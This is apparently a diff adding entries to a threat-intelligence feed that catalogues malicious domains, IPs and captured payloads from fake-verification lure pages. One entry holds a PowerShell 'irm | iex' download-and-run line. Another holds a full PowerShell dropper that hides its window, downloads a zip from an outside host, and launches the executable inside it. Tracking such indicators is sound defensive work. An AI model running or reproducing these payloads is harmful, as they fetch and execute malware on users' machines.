@@ -1,5 +1,50 @@
 [
   {
+    "UrlDomain": "jonettasmith.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "50.87.253.215"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/f4783b5bf31293eb",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29921425",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/f4783b5bf31293eb'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/f4783b5bf31293eb"
+    ],
+    "ReportId": "cmwqqo73r28eh0omli28sjqkd",
+    "ScannedAt": "2026-11-21T18:26:04.212000+00:00"
+  },
+  {
+    "UrlDomain": "programacionlineal.net",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "93.127.179.228"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwqqaax7281a0omlwpjbmm8f",
+    "ScannedAt": "2026-11-21T18:15:15.857000+00:00"
+  },
+  {
     "UrlDomain": "grupoporraspyp.net",
     "DeliveryUrl": [
       "img-codes-cloude.info",
